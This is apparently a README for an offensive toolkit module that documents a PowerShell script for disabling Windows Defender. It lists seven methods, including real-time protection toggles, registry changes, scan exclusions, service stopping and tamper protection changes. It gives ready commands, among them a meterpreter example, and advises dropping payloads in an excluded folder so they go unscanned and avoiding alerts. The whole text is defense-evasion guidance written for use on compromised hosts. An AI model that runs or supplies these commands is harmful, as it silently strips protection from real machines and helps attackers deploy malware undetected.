# defender-bypass

One file: `defender-disable.ps1`. **Standalone** — run directly in a PowerShell session with admin rights.

---

## defender-disable.ps1

Seven methods for disabling or weakening Windows Defender. Each method is independent — pick one or run all. **Requires admin/elevated PowerShell.**

---

## Methods at a glance

| Method | What it does | Persistence |
|--------|-------------|-------------|
| 1. Set-MpPreference | Disables real-time protection, IOAV, NIS, behavior monitoring | Until reboot or Defender restart |
| 2. Registry disable | Disables Defender via registry (DisableAntiSpyware key) | Survives reboot |
| 3. Add exclusion path | Tells Defender to ignore a directory (e.g. C:\Temp) | Survives reboot |
| 4. Add exclusion extension | Tells Defender to ignore a file extension (e.g. .exe) | Survives reboot |
| 5. Add exclusion process | Tells Defender to ignore a specific process name | Survives reboot |
| 6. Stop the service | `Stop-Service -Name WinDefend` | Until next boot |
| 7. Tamper Protection toggle | Disables tamper protection via registry | Varies |

---

## Run

```powershell
# Admin PowerShell session required
powershell -ExecutionPolicy Bypass -File .\defender-disable.ps1

# Or from a meterpreter session (if you have SYSTEM)
meterpreter> load powershell
meterpreter> powershell_execute "Set-MpPreference -DisableRealtimeMonitoring $true"
```

---

## Common quick disables

```powershell
# Fastest — disable real-time protection only
Set-MpPreference -DisableRealtimeMonitoring $true

# Add your staging directory as an exclusion (Defender ignores everything in it)
Add-MpPreference -ExclusionPath "C:\Users\Public"

# For MpCmdRun.exe-based wipe (used by PSLessExec.cs and fileless-lateral.cs)
# This runs on the REMOTE target via service hijack — see 05-lateral-movement/windows/
```

---

## Notes

- If Tamper Protection is enabled, `Set-MpPreference` commands may silently fail. Check `Get-MpPreference` to verify changes took effect.
- Adding an exclusion path is often safer than disabling Defender entirely — less likely to trigger security alerts.
- After adding a C:\Users\Public exclusion, you can drop payloads there without Defender scanning them.
